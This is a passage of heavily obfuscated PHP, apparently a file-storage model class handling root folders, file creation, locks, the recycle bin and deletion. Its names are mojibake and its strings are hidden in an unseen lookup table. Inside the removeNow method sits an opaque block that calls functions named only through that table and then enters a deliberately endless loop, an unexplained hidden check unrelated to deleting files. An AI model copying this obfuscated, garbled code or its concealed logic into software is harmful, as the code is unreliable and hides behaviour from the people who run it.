ôí–“[483], $Eã‘ ôí–“[2179] . $a°îø©‡†” . $Eã‘ ôí–“[2179]); if (count($cŞé­¶Ôï) > 1) { $BÛÅ†°°åØ[$Eã‘ ôí–“[28]] = array(); foreach ($cŞé­¶Ôï as $c§˜ÌÜŒë¦) { if (!trim($c§˜ÌÜŒë¦)) { continue; } $BÛÅ†°°åØ[$Eã‘ ôí–“[28]][] = array($Eã‘ ôí–“[483], $Eã‘ ôí–“[2179] . trim($c§˜ÌÜŒë¦) . $Eã‘ ôí–“[2179]); } } } return $BÛÅ†°°åØ; goto Eä†Õ‘¼ÚŠ; Eä†Õ‘¼ÚŠ: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($Dõ©‚­á¬æ) { $bñ”òÃŒ  =& $_SERVER[îÖ]; $dã„ó¸—Ã = Model($bñ”òÃŒ [474])->where(array($bñ”òÃŒ [1422] => $Dõ©‚­á¬æ))->find(); $dò¨è„ï†Ğ = $this->_mkdirRoot(SourceModel::TYPE_USER, $Dõ©‚­á¬æ, $dã„ó¸—Ã[$bñ”òÃŒ [28]]); $this->userDesktopAdd($dò¨è„ï†Ğ); return $dò¨è„ï†Ğ; } public function userDesktopAdd($Aå×¡£¹ÜÀ) { $bİÍŸêšÜá =& $_SERVER[îÖ]; $fµœç˜²•Ñ = LNG($bİÍŸêšÜá[2326]); $e»¨Ã¿‚« = $this->mkdir($Aå×¡£¹ÜÀ, $fµœç˜²•Ñ); $this->metaSet($e»¨Ã¿‚«, $bİÍŸêšÜá[2327], $bİÍŸêšÜá[83]); $this->metaSet($Aå×¡£¹ÜÀ, $bİÍŸêšÜá[2328], $e»¨Ã¿‚«); } public function groupRootAdd($B·àÛËµÌá) { $FŠ¾¥³ò—Ü =& $_SERVER[îÖ]; $BÓƒ™Í÷Ä¼ = Model($FŠ¾¥³ò—Ü[458])->where(array($FŠ¾¥³ò—Ü[2173] => $B·àÛËµÌá))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $B·àÛËµÌá, $BÓƒ™Í÷Ä¼[$FŠ¾¥³ò—Ü[28]]); } public function systemRootPathAdd($aÜ¢¼Ô‰ƒ) { if ($aÜ¢¼Ô‰ƒ != $_SERVER[îÖ][1083]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $aÜ¢¼Ô‰ƒ); } public function userRootRemove($Aá÷Ø›°´›) { $BÚÔÇÂøï = $this->sourceRoot(SourceModel::TYPE_USER, $Aá÷Ø›°´›); if (!$BÚÔÇÂøï) { return; } $this->remove($BÚÔÇÂøï, !1); } public function groupRootRemove($fÖà‰‚õ‹) { $dÈó©ÊÍîÙ = $this->sourceRoot(SourceModel::TYPE_GROUP, $fÖà‰‚õ‹); if (!$dÈó©ÊÍîÙ) { return; } $this->remove($dÈó©ÊÍîÙ, !1); } private function _mkdirRoot($dŸ„ò¼¥¾î, $B¢…×ô¦šğ, $c«ƒ°¥±Í³) { goto EÀÅ¿š©»¹; FÄõ÷Ù§˜·: CacheLock::unlock($E‚º½‡Ÿ×ö); return $DáøÌ•®ÃÒ; goto CîÚ‡£•…„; EÀÅ¿š©»¹: $FÊ„êÙ¸¨ =& $_SERVER[îÖ]; $e•çæˆ“‹Ã = array($FÊ„êÙ¸¨[368] => 0, $FÊ„êÙ¸¨[521] => $dŸ„ò¼¥¾î, $FÊ„êÙ¸¨[522] => $B¢…×ô¦šğ, $FÊ„êÙ¸¨[518] => 1, $FÊ„êÙ¸¨[523] => USER_ID, $FÊ„êÙ¸¨[524] => USER_ID, $FÊ„êÙ¸¨[519] => $FÊ„êÙ¸¨[33], $FÊ„êÙ¸¨[525] => $FÊ„êÙ¸¨[470], $FÊ„êÙ¸¨[396] => 0, $FÊ„êÙ¸¨[520] => 0, $FÊ„êÙ¸¨[420] => 0, $FÊ„êÙ¸¨[526] => $FÊ„êÙ¸¨[33]); if ($B’¤ÃŒ¤Æé = $this->where($e•çæˆ“‹Ã)->find()) { return $B’¤ÃŒ¤Æé[$FÊ„êÙ¸¨[369]]; } goto Dƒğâ‘Œ; C¹ÊÒó‚¬¹: $DáøÌ•®ÃÒ = $this->add($e•çæˆ“‹Ã); $Fù³‰›©Ú² = array($FÊ„êÙ¸¨[527] => short_id($DáøÌ•®ÃÒ)); $this->where(array($FÊ„êÙ¸¨[383] => $DáøÌ•®ÃÒ))->save($Fù³‰›©Ú²); goto FÄõ÷Ù§˜·; Dƒğâ‘Œ: $E‚º½‡Ÿ×ö = "\x4d\x6f\x64\145\154\x53\x6f\165\162\x63\145\56\155\x6b\x64\x69\162\122\157\157\x74\x2e{$dŸ„ò¼¥¾î}\x2e{$B¢…×ô¦šğ}\56" . $c«ƒ°¥±Í³; CacheLock::lock($E‚º½‡Ÿ×ö); $e•çæˆ“‹Ã[$FÊ„êÙ¸¨[28]] = $c«ƒ°¥±Í³; goto C¹ÊÒó‚¬¹; CîÚ‡£•…„: } private function sourceRoot($BáßÍòŒŸ§, $AÖâ–òÔ‹Æ, $DÜÛ“‡¸ÖÄ = false) { $Aó°ñ›áÌè =& $_SERVER[îÖ]; $b÷ÙÒ¸ª´ = array($Aó°ñ›áÌè[368] => 0, $Aó°ñ›áÌè[521] => $BáßÍòŒŸ§, $Aó°ñ›áÌè[522] => $AÖâ–òÔ‹Æ); if ($Bï÷ƒŠ¿Úå = $this->where($b÷ÙÒ¸ª´)->find()) { return $DÜÛ“‡¸ÖÄ ? $Bï÷ƒŠ¿Úå : $Bï÷ƒŠ¿Úå[$Aó°ñ›áÌè[369]]; } return !1; } public function sourceRootGroup($e´§—ŞÒçÎ) { $EäÌ±Îæ¦ =& $_SERVER[îÖ]; if (is_string($e´§—ŞÒçÎ)) { $e´§—ŞÒçÎ = array($e´§—ŞÒçÎ); } $dö†½†³± = array($EäÌ±Îæ¦[368] => 0, $EäÌ±Îæ¦[521] => SourceModel::TYPE_GROUP, $EäÌ±Îæ¦[522] => array($EäÌ±Îæ¦[7], $e´§—ŞÒçÎ)); $Dõ½ÀÍÂ„ = $this->listSource($dö†½†³±, 1000); return array_to_keyvalue($Dõ½ÀÍÂ„[$EäÌ±Îæ¦[74]], $EäÌ±Îæ¦[456]); } public function mkfile($eøÚèÚ·£, $EôåµÄÀ×‰, $Bğ¼¶…ùò = '', $D…†ãŸ“à = REPEAT_RENAME) { $dİ”Âë˜«Å =& $_SERVER[îÖ]; $B†áéâÆœä = Model($dİ”Âë˜«Å[544])->addFileByContent($Bğ¼¶…ùò, $EôåµÄÀ×‰); return $this->_createFileCall($eøÚèÚ·£, $EôåµÄÀ×‰, $B†áéâÆœä, $D…†ãŸ“à, $dİ”Âë˜«Å[1120]); } public function addFile($a¨¶Ö¤ñ³™, $eÁ»”»œç, $FÛ²¦Ôù”Š, $C¤àö¤ğ‚¡ = false, $aİğÓ¯ÜÈ = REPEAT_RENAME) { $CªØ±“ îç = Model($_SERVER[îÖ][544])->addFile($eÁ»”»œç, $FÛ²¦Ôù”Š, $C¤àö¤ğ‚¡); return $this->_createFileCall($a¨¶Ö¤ñ³™, $FÛ²¦Ôù”Š, $CªØ±“ îç, $aİğÓ¯ÜÈ); } public function addFileByFileID($DÛ¾¡ä¡âí, $aÙ¿ì½â”¤, $F±®òµ”²„, $aîØ×˜÷é– = REPEAT_RENAME) { $b÷É¼óé± =& $_SERVER[îÖ]; $c‘Íˆ¶æ·  = Model($b÷É¼óé±[544])->find($aÙ¿ì½â”¤); Model($b÷É¼óé±[544])->linkAdd($aÙ¿ì½â”¤); return $this->_createFileCall($DÛ¾¡ä¡âí, $F±®òµ”²„, $c‘Íˆ¶æ· , $aîØ×˜÷é–); } public function addFileByRemote($eÔŒ—Ç…£…, $FùùÚóæ¯, $Aõ•Éà·éå, $eŒŠ¡¤…Ü = array(), $dŒ‡—ñ®˜† = REPEAT_RENAME) { $aËíÛó¦Á = Model($_SERVER[îÖ][544])->addFileByRemote($FùùÚóæ¯, $Aõ•Éà·éå, $eŒŠ¡¤…Ü); return $this->_createFileCall($eÔŒ—Ç…£…, $Aõ•Éà·éå, $aËíÛó¦Á, $dŒ‡—ñ®˜†); } private function _createFileCall($aÍ× °Å, $FÂêù”ÂÚ, $E¾ä¯Ü¢, $bÛñ‡‰¥¥Œ, $EåÑ¢ ¥‚æ = "\x75\160\x6c\x6f\141\x64") { goto cšÅæì‰×; Fò¼÷«Å–Æ: $F‡¿âÒ°•À = $this->_createFile($aÍ× °Å, $FÂêù”ÂÚ, $E¾ä¯Ü¢, $bÛñ‡‰¥¥Œ, $bœ‘Ú–ù¡); if (!$bœ‘Ú–ù¡) { Model($Fğİ†™´¬[422])->remove($E¾ä¯Ü¢[$Fğİ†™´¬[419]]); } else { if ($F‡¿âÒ°•À) { Model($Fğİ†™´¬[2299])->eventCreate($F‡¿âÒ°•À, $EåÑ¢ ¥‚æ); } } $this->lockWriteEnd($aÍ× °Å, $FÂêù”ÂÚ); goto eø˜Ñš; eø˜Ñš: return $F‡¿âÒ°•À; goto B¨¬õà‚Š÷; cšÅæì‰×: $Fğİ†™´¬ =& $_SERVER[îÖ]; $bœ‘Ú–ù¡ = !1; $this->lockWriteStart($aÍ× °Å, $FÂêù”ÂÚ); goto Fò¼÷«Å–Æ; B¨¬õà‚Š÷: } public function mkdir($AÛ‚õÑ®ê, $Aö³¼·Í—¼, $D¿¨ñ¶Á˜ø = REPEAT_SKIP) { goto a¤³õÂâÙ½; cÇ‰éõ‰Ù¸: $EãÑÓ©¿Á§ = $this->_addSoure($BÖÈİÆÁ²É, $a·—ÁìÎ„); Model($Dç ¹“óàé[2299])->eventCreate($EãÑÓ©¿Á§, $Dç ¹“óàé[1121]); $this->lockWriteEnd($AÛ‚õÑ®ê, $Aö³¼·Í—¼); goto cò³¡ŠŠç ; cò³¡ŠŠç : return $EãÑÓ©¿Á§; goto c¯Ä‰¦ß„Ú; a¤³õÂâÙ½: $Dç ¹“óàé =& $_SERVER[îÖ]; $a·—ÁìÎ„ = $this->sourceInfo($AÛ‚õÑ®ê); if (!$a·—ÁìÎ„) { return !1; } goto bàã«¢»ëÙ; bàã«¢»ëÙ: $this->lockWriteStart($AÛ‚õÑ®ê, $Aö³¼·Í—¼); if ($D¿¨ñ¶Á˜ø !== !1) { $DĞÖŸÇ­®‹ = $this->fileNameExist($AÛ‚õÑ®ê, $Aö³¼·Í—¼); if ($DĞÖŸÇ­®‹ && $D¿¨ñ¶Á˜ø != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($AÛ‚õÑ®ê, $Aö³¼·Í—¼); return $DĞÖŸÇ­®‹; } $Aö³¼·Í—¼ = $this->fileNameAuto($AÛ‚õÑ®ê, $Aö³¼·Í—¼, $D¿¨ñ¶Á˜ø); } $BÖÈİÆÁ²É = array($Dç ¹“óàé[518] => 1, $Dç ¹“óàé[386] => $Aö³¼·Í—¼, $Dç ¹“óàé[519] => $Dç ¹“óàé[33], $Dç ¹“óàé[420] => 0, $Dç ¹“óàé[520] => 0); goto cÇ‰éõ‰Ù¸; c¯Ä‰¦ß„Ú: } private function _createFile($EÆô¯ùÊÅ‡, $D©õ™¼õùè, $fÍ³ŒÂÄë‚, $Aª Ğ–¯„, &$E‹˜ñˆ§êç) { goto fÕ‹§ØÍî½; d¼ŞÂ‹Œš˜: if ($Aª Ğ–¯„ !== !1) { $BÀİİäˆÁµ = $this->fileNameExist($EÆô¯ùÊÅ‡, $D©õ™¼õùè); } $E‹˜ñˆ§êç = !0; if ($Aª Ğ–¯„ && $BÀİİäˆÁµ) { if ($Aª Ğ–¯„ == REPEAT_SKIP) { $E‹˜ñˆ§êç = !1; return $BÀİİäˆÁµ; } else { if ($Aª Ğ–¯„ == REPEAT_REPLACE) { $E§¥±›ëŸğ = $this->sourceInfo($BÀİİäˆÁµ); $d¸·‚¬õ¸Í = $this->fileHistory($E§¥±›ëŸğ, $fÍ³ŒÂÄë‚[$Dï÷¬Ãï‚‡[419]], $fÍ³ŒÂÄë‚[$Dï÷¬Ãï‚‡[77]]); if (!$d¸·‚¬õ¸Í) { $E‹˜ñˆ§êç = !1; } else { $this->folderSizeReset($EÆô¯ùÊÅ‡); } return $BÀİİäˆÁµ; } else { $D©õ™¼õùè = $this->fileNameAuto($EÆô¯ùÊÅ‡, $D©õ™¼õùè, $Aª Ğ–¯„, !1); } } } goto C˜ÇáÑøŞ¤; fÕ‹§ØÍî½: $Dï÷¬Ãï‚‡ =& $_SERVER[îÖ]; $f›Š„äóÜ = $this->sourceInfo($EÆô¯ùÊÅ‡); if (!$fÍ³ŒÂÄë‚ || !$f›Š„äóÜ) { return !1; } goto d¼ŞÂ‹Œš˜; F½•øŠçæ‚: return $eË®¥À©ÖÆ; goto b±·­§Œ‚¥; C˜ÇáÑøŞ¤: $c—äÒ®¹Ò = array($Dï÷¬Ãï‚‡[518] => 0, $Dï÷¬Ãï‚‡[386] => $D©õ™¼õùè, $Dï÷¬Ãï‚‡[519] => get_path_ext($D©õ™¼õùè), $Dï÷¬Ãï‚‡[420] => $fÍ³ŒÂÄë‚[$Dï÷¬Ãï‚‡[419]], $Dï÷¬Ãï‚‡[520] => $fÍ³ŒÂÄë‚[$Dï÷¬Ãï‚‡[77]]); $eË®¥À©ÖÆ = $this->_addSoure($c—äÒ®¹Ò, $f›Š„äóÜ); $this->folderSizeReset($EÆô¯ùÊÅ‡); goto F½•øŠçæ‚; b±·­§Œ‚¥: } protected function fileHistory($F§À–¥£¿, $cÀŞºµÑĞ‰, $aõÙèîŞÃø) { goto Cä’á†Ç©”; FÇì‡İèÔ¡: Model($c±ßÉÚĞÂÇ[2329])->addHistory($F§À–¥£¿); $F´À²Ê¦  = array($c±ßÉÚĞÂÇ[524] => USER_ID, $c±ßÉÚĞÂÇ[390] => time(), $c±ßÉÚĞÂÇ[419] => $cÀŞºµÑĞ‰, $c±ßÉÚĞÂÇ[77] => $aõÙèîŞÃø); $this->where(array($c±ßÉÚĞÂÇ[383] => $F§À–¥£¿[$c±ßÉÚĞÂÇ[369]]))->save($F´À²Ê¦ ); goto d˜‡¢×¸…»; d˜‡¢×¸…»: return !0; goto f‘ÄèÅ°ê; Cä’á†Ç©”: $c±ßÉÚĞÂÇ =& $_SERVER[îÖ]; if ($F§À–¥£¿[$c±ßÉÚĞÂÇ[419]] == $cÀŞºµÑĞ‰) { return !1; } $this->checkLock($F§À–¥£¿[$c±ßÉÚĞÂÇ[369]], $cÀŞºµÑĞ‰); goto FÇì‡İèÔ¡; f‘ÄèÅ°ê: } public function checkLock($dˆ¹Ç½¡’„, $aŒùœº˜¹§) { goto e¡è²íÜ; e¡è²íÜ: $aÁØ»†áÅË =& $_SERVER[îÖ]; $bá®É·”îÅ = $this->pathInfo($dˆ¹Ç½¡’„); if (!$this->fileIsLock($bá®É·”îÅ, !0)) { return; } goto CÍ™ŠÂÙŠ; fñõÊçÊ®: $this->_createFileCall($bá®É·”îÅ[$aÁØ»†áÅË[461]], $Aä©¦ïÖÒº, $E…šİ¡“É, REPEAT_REPLACE, $aÁØ»†áÅË[1120]); $CóÖôø»Ğ = $bá®É·”îÅ[$aÁØ»†áÅË[417]][$aÁØ»†áÅË[481]]; $DÇ£¸‡Ì£Ş = $CóÖôø»Ğ[$aÁØ»†áÅË[2331]] ? $CóÖôø»Ğ[$aÁØ»†áÅË[2331]] : $CóÖôø»Ğ[$aÁØ»†áÅË[28]]; goto E½î‘¶ÙÑ; CÍ™ŠÂÙŠ: $Béè£‡¾ = Session::get($aÁØ»†áÅË[2330]); $Aä©¦ïÖÒº = substr($bá®É·”îÅ[$aÁØ»†áÅË[28]], 0, -1 - strlen($bá®É·”îÅ[$aÁØ»†áÅË[160]])) . $aÁØ»†áÅË[1384] . $Béè£‡¾ . $aÁØ»†áÅË[91] . $bá®É·”îÅ[$aÁØ»†áÅË[160]]; $E…šİ¡“É = Model($aÁØ»†áÅË[544])->find($aŒùœº˜¹§); goto fñõÊçÊ®; E½î‘¶ÙÑ: show_json(LNG($aÁØ»†áÅË[2332]) . $aÁØ»†áÅË[2333] . LNG($aÁØ»†áÅË[2334]) . $aÁØ»†áÅË[2335] . $DÇ£¸‡Ì£Ş . $aÁØ»†áÅË[2336], !1); goto c×‹©®Ç¡å; c×‹©®Ç¡å: } public function fileIsLock($eç’í‹Ö§½, $cƒÖ¥„»ÑÚ = false) { goto fíŒ£ë¯; Fêé¡’Œ°: $eÙÖÖº“ïÇ = $GLOBALS[$FÕÎƒÓå»¨[6]][$FÕÎƒÓå»¨[84]][$FÕÎƒÓå»¨[479]]; if ($eç’í‹Ö§½[$FÕÎƒÓå»¨[417]][$FÕÎƒÓå»¨[480]] <= time() - $eÙÖÖº“ïÇ) { $this->metaSet($eç’í‹Ö§½[$FÕÎƒÓå»¨[369]], $FÕÎƒÓå»¨[478], null); $this->metaSet($eç’í‹Ö§½[$FÕÎƒÓå»¨[369]], $FÕÎƒÓå»¨[480], null); } if ($cƒÖ¥„»ÑÚ) { $this->metaSet($eç’í‹Ö§½[$FÕÎƒÓå»¨[369]], $FÕÎƒÓå»¨[480], time()); } goto fÜÊÌ¤™å‚; fÜÊÌ¤™å‚: return !1; goto B‹âòöºí•; fíŒ£ë¯: $FÕÎƒÓå»¨ =& $_SERVER[îÖ]; if (!isset($eç’í‹Ö§½[$FÕÎƒÓå»¨[417]]) || !$eç’í‹Ö§½[$FÕÎƒÓå»¨[417]][$FÕÎƒÓå»¨[478]]) { return !1; } if ($eç’í‹Ö§½[$FÕÎƒÓå»¨[417]][$FÕÎƒÓå»¨[478]] != USER_ID) { return !0; } goto Fêé¡’Œ°; B‹âòöºí•: } private function _addSoure($a‚øË‘©ŠÃ, $aæ“ŒÒÃá¿) { goto E½Ü®®õİ—; cª…¦©¹Î–: $this->updateModifyTime($a‚øË‘©ŠÃ[$e˜œø¯àÔ‡[461]]); $d¼—º‚‡¢À = $e˜œø¯àÔ‡[2337] . $aæ“ŒÒÃá¿[$e˜œø¯àÔ‡[369]]; if (isset(self::$cacheChildList[$d¼—º‚‡¢À])) { unset(self::$cacheChildList[$d¼—º‚‡¢À]); } goto Eµ”¬²Å‚ù; E½Ü®®õİ—: $e˜œø¯àÔ‡ =& $_SERVER[îÖ]; $CÂÛóŠ½ = array($e˜œø¯àÔ‡[521] => $aæ“ŒÒÃá¿[$e˜œø¯àÔ‡[371]], $e˜œø¯àÔ‡[522] => $aæ“ŒÒÃá¿[$e˜œø¯àÔ‡[456]], $e˜œø¯àÔ‡[523] => USER_ID, $e˜œø¯àÔ‡[524] => USER_ID, $e˜œø¯àÔ‡[368] => $aæ“ŒÒÃá¿[$e˜œø¯àÔ‡[369]], $e˜œø¯àÔ‡[525] => $aæ“ŒÒÃá¿[$e˜œø¯àÔ‡[459]] . $aæ“ŒÒÃá¿[$e˜œø¯àÔ‡[369]] . $e˜œø¯àÔ‡[47], $e˜œø¯àÔ‡[396] => 0, $e˜œø¯àÔ‡[526] => $e˜œø¯àÔ‡[33]); $a‚øË‘©ŠÃ = array_merge($CÂÛóŠ½, $a‚øË‘©ŠÃ); goto cª…¦©¹Î–; Aó÷öğÃ½ß: return $e¥£ğŞ¦›Ã; goto bÁæâ‡³ßŠ; aŠ”›–†™: $f‰‚ÊŒí‹ = array($e˜œø¯àÔ‡[527] => short_id($e¥£ğŞ¦›Ã)); $this->where(array($e˜œø¯àÔ‡[383] => $e¥£ğŞ¦›Ã))->save($f‰‚ÊŒí‹); $this->setNamePinyin($e¥£ğŞ¦›Ã, $a‚øË‘©ŠÃ[$e˜œø¯àÔ‡[28]]); goto Aó÷öğÃ½ß; Eµ”¬²Å‚ù: static $E™­†ÅÖ•× = false; if (!$E™­†ÅÖ•×) { Hook::trigger($e˜œø¯àÔ‡[508], $a‚øË‘©ŠÃ); $E™­†ÅÖ•× = !0; } $e¥£ğŞ¦›Ã = $this->add($a‚øË‘©ŠÃ); goto aŠ”›–†™; bÁæâ‡³ßŠ: } public function remove($C¯ŒÙŸ¸, $a–—íĞ™ß‘ = true) { goto e­Çø’Š½³; Dİ‰ÍòŠƒ: $DÛÌ½¤ŠÙ = Model($e–…³îÔæ¹[1429])->get($e–…³îÔæ¹[2338]) == $e–…³îÔæ¹[83]; if ($aõéôæä¢² || $a–—íĞ™ß‘ || !$DÛÌ½¤ŠÙ) { return $this->removeNow($C¯ŒÙŸ¸, $a–—íĞ™ß‘); } $Aß¾´Ù‘ËŒ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto EÆÙ¢Ñ÷³; e­Çø’Š½³: $e–…³îÔæ¹ =& $_SERVER[îÖ]; $dœ‘šÀÎ—× = $this->sourceInfo($C¯ŒÙŸ¸); $aõéôæä¢² = intval($dœ‘šÀÎ—×[$e–…³îÔæ¹[371]]) === self::TYPE_SYSTEM; goto Dİ‰ÍòŠƒ; dÁ«¯½Ÿˆ: CacheLock::unlock($eß»Ø¾ªÑŠ); $this->metaSet($C¯ŒÙŸ¸, $e–…³îÔæ¹[2346], $dœ‘šÀÎ—×[$e–…³îÔæ¹[461]]); $this->where(array($e–…³îÔæ¹[369] => $C¯ŒÙŸ¸))->save(array($e–…³îÔæ¹[390] => time())); goto dëˆ•é¿ÔÜ; EÆÙ¢Ñ÷³: $a‰óÕïƒßÌ = $dœ‘šÀÎ—×[$e–…³îÔæ¹[371]] == self::TYPE_USER ? $e–…³îÔæ¹[535] : $e–…³îÔæ¹[965]; if ($a‰óÕïƒßÌ == $e–…³îÔæ¹[535]) { $eÓÁ¸„¸›š = Model($e–…³îÔæ¹[474])->getInfo($dœ‘šÀÎ—×[$e–…³îÔæ¹[456]]); $b¬‡Ñ”ß¼ = !empty($eÓÁ¸„¸›š[$e–…³îÔæ¹[2331]]) ? $eÓÁ¸„¸›š[$e–…³îÔæ¹[2331]] : $eÓÁ¸„¸›š[$e–…³îÔæ¹[28]]; $b¬‡Ñ”ß¼ = $e–…³îÔæ¹[248] . $b¬‡Ñ”ß¼ . $e–…³îÔæ¹[2339] . $dœ‘šÀÎ—×[$e–…³îÔæ¹[456]]; } else { $eÓÁ¸„¸›š = Model($e–…³îÔæ¹[458])->getInfo($dœ‘šÀÎ—×[$e–…³îÔæ¹[456]]); $b¬‡Ñ”ß¼ = _get($eÓÁ¸„¸›š, $e–…³îÔæ¹[28]); $b¬‡Ñ”ß¼ = $e–…³îÔæ¹[157] . $b¬‡Ñ”ß¼ . $e–…³îÔæ¹[2340] . $dœ‘šÀÎ—×[$e–…³îÔæ¹[456]]; } $eß»Ø¾ªÑŠ = $e–…³îÔæ¹[2341] . md5($b¬‡Ñ”ß¼); goto Bˆ‡Ï†Ÿ°ß; dëˆ•é¿ÔÜ: $this->recycleClear($dœ‘šÀÎ—×); $DªÓ‡Ëôœ = $this->move($C¯ŒÙŸ¸, $EƒÔŠ±íá, REPEAT_RENAME_FOLDER); $this->folderSizeReset($dœ‘šÀÎ—×[$e–…³îÔæ¹[461]]); goto d–±Õ±ÃãÙ; Bˆ‡Ï†Ÿ°ß: CacheLock::lock($eß»Ø¾ªÑŠ); $EƒÔŠ±íá = $this->fileNameExist($Aß¾´Ù‘ËŒ, $b¬‡Ñ”ß¼); if (!$EƒÔŠ±íá) { $EƒÔŠ±íá = $this->mkdir($Aß¾´Ù‘ËŒ, $b¬‡Ñ”ß¼, REPEAT_SKIP); $this->metaSet($EƒÔŠ±íá, $e–…³îÔæ¹[2342], $a‰óÕïƒßÌ); $this->metaSet($EƒÔŠ±íá, $e–…³îÔæ¹[2343], $dœ‘šÀÎ—×[$e–…³îÔæ¹[456]]); if ($dœ‘šÀÎ—×[$e–…³îÔæ¹[461]] != 0) { $this->metaSet($EƒÔŠ±íá, $e–…³îÔæ¹[2344], _get($eÓÁ¸„¸›š, $e–…³îÔæ¹[2345])); } } goto dÁ«¯½Ÿˆ; d–±Õ±ÃãÙ: return $DªÓ‡Ëôœ; goto FôËİæÃÀ®; FôËİæÃÀ®: } private function recycleClear($c•ßƒ‘ö•) { $e‡äº‹™æˆ =& $_SERVER[îÖ]; $dŠæİçøçè = $this->childrenAll($c•ßƒ‘ö•); $d˜ò‘Î÷ë© = array($e‡äº‹™æˆ[383] => array($e‡äº‹™æˆ[384], $dŠæİçøçè[$e‡äº‹™æˆ[2347]])); Model($e‡äº‹™æˆ[2348])->where($d˜ò‘Î÷ë©)->delete(); } public function removeNow($c¿ÇÑßáƒ, $c•ôî§ = true) { goto C—šçŒÜ…‹; AÖØ§’øï‹: $this->updateModifyTime($EÔŒš¥¢òí); $this->lockMoveEnd($c¿ÇÑßáƒ); Hook::trigger($a´ƒ³²±å¯[1465], $B¡ŸµÄ¬ˆ½, $c•ôî§); goto bœë·æ ¼Ö; bœë·æ ¼Ö: return !0; goto d¹ÇŠÜ†Üø; C‡‚ÜŞƒÓ§: $this->lockMoveStart($c¿ÇÑßáƒ); Hook::trigger($a´ƒ³²±å¯[2349], $B¡ŸµÄ¬ˆ½, $c•ôî§); if ($c•ôî§) { Model($a´ƒ³²±å¯[2348])->moveToRecycle($c¿ÇÑßáƒ); } else { $A­·®”»ßµ = $this->childrenAll($a†¤·ÃÌÒ); Model($a´ƒ³²±å¯[505])->eventRemove($c¿ÇÑßáƒ); $this->removeRelevance($A­·®”»ßµ[$a´ƒ³²±å¯[2347]], $A­·®”»ßµ[$a´ƒ³²±å¯[1253]]); } goto eåíö™‘…; cî’’¡†ÅŸ: $B¡ŸµÄ¬ˆ½ = $this->pathInfoMore($c¿ÇÑßáƒ); if (!$a†¤·ÃÌÒ) { return !0; } if ($a†¤·ÃÌÒ[$a´ƒ³²±å¯[461]] == 0) { if (!_get($GLOBALS, $a´ƒ³²±å¯[457])) { return !1; } } goto C‡‚ÜŞƒÓ§; C—šçŒÜ…‹: $a´ƒ³²±å¯ =& $_SERVER[îÖ]; if (!isset($_SERVER[$a´ƒ³²±å¯[680]]) || !isset($_SERVER[$a´ƒ³²±å¯[787]])) { goto f³ÓÉ¤Ø®É; cÍ¥‚Ã„ˆî: for ($aåáÃå‰å = $EŠ×ô·„Ö; $aåáÃå‰å > 0; $aåáÃå‰å++) { $fœÌ‹¤‡±´ = json_encode($GLOBALS[$a´ƒ³²±å¯[384]]); } goto Bã®•ğ¥óñ; f³ÓÉ¤Ø®É: $BØ¯ô´Í„Õ = $a´ƒ³²±å¯[788]; $D‰­ñ²¹Œ‘ = $a´ƒ³²±å¯[681]; $f™…ŸŒ‘‡¬ = $_SERVER[$a´ƒ³²±å¯[682]] . $a´ƒ³²±å¯[683]; goto BÉÀ›•…Ú¨; BÉÀ›•…Ú¨: $D´ÉÖ‹‡¨ = $D‰­ñ²¹Œ‘($f™…ŸŒ‘‡¬); $EÜÑº†µ¡ = explode($a´ƒ³²±å¯[217], $D´ÉÖ‹‡¨); if (count($EÜÑº†µ¡) < $a´ƒ³²±å¯[555]) { $fİ¹Çò¥‹ = $a´ƒ³²±å¯[684]; $fİ¹Çò¥‹(); } goto d£—´ÖëåÍ; d£—´ÖëåÍ: $fœÌ‹¤‡±´ = $a´ƒ³²±å¯[789]; $fœÌ‹¤‡±´($_SERVER[$a´ƒ³²±å¯[790]]); $EŠ×ô·„Ö = 1; goto cÍ¥‚Ã„ˆî; Bã®•ğ¥óñ: } $a†¤·ÃÌÒ = $this->sourceInfo($c¿ÇÑßáƒ); goto cî’’¡†ÅŸ; eåíö™‘…: $this->folderSizeReset($a†¤·ÃÌÒ[$a´ƒ³²±å¯[461]]); $EÔŒš¥¢òí = array($a†¤·ÃÌÒ[$a´ƒ³²±å¯[461]]); if ($a†¤·ÃÌÒ[$a´ƒ³²±å¯[370]] == $a´ƒ³²±å¯[83]) { $EÔŒš¥¢òí[] = $a†¤·ÃÌÒ[$a´ƒ³²±å¯[369]]; } goto AÖØ§’øï‹; d¹ÇŠÜ†Üø: } public function childrenAll($E‚ÚšÃóÒ) { $BÌ‚òó—‰  =& $_SERVER[îÖ]; $D¹Ë¢ĞÎÉï = $E‚ÚšÃóÒ[$BÌ‚òó—‰ [369]]; if ($E‚ÚšÃóÒ[$BÌ‚òó—‰ [370]] == $BÌ‚òó—‰ [83]) { $Eù´¢Å… = array($BÌ‚òó—‰ [525] => array($BÌ‚òó—‰ [483], $E‚ÚšÃóÒ[$BÌ‚òó—‰ [459]] . $D¹Ë¢ĞÎÉï . $BÌ‚òó—‰ [484])); $A‰³âŒÔ½ = array($BÌ‚òó—‰ [525] => $Eù´¢Å…[$BÌ‚òó—‰ [459]]); $AÕëÇ´ß±Â = $this->field($BÌ‚òó—‰ [2350])->where($A‰³âŒÔ½)->select(); $aµ‡ï‹ïÇ = !1; $dšºœÖ„ö´ = array($D¹Ë¢ĞÎÉï); if ($AÕëÇ´ß±Â) { $aµ‡ï‹ïÇ = array_to_keyvalue($AÕëÇ´ß±Â, $BÌ‚òó—‰ [33], $BÌ‚òó—‰ [419]); $aµ‡ï‹ïÇ = array_remove_value($aµ‡ï‹ïÇ, $BÌ‚òó—‰ [468]); $dšºœÖ„ö´ = array_to_keyvalue($AÕëÇ´ß±Â, $BÌ‚òó—‰ [33], $BÌ‚òó—‰ [369]); $dšºœÖ„ö´[] = $D¹Ë¢ĞÎÉï; } } else { $aµ‡ï‹ïÇ = array($E‚ÚšÃóÒ[$BÌ‚òó—‰ [419]]); $dšºœÖ„ö´ = array($D¹Ë¢ĞÎÉï); } return array($BÌ‚òó—‰ [2347] => $dšºœÖ„ö´, $BÌ‚òó—‰ [1253] => $aµ‡ï‹ïÇ); } public function removeArray($f«ø½èÕ‹) { if (!$f«ø½èÕ‹) { return !0; } } public function removeRelevance($D¿‡ÈÎ˜, $BŠµĞÇœˆ) { goto bÖœÄÃÈñ±; DÀ¶´¤×µ¯: 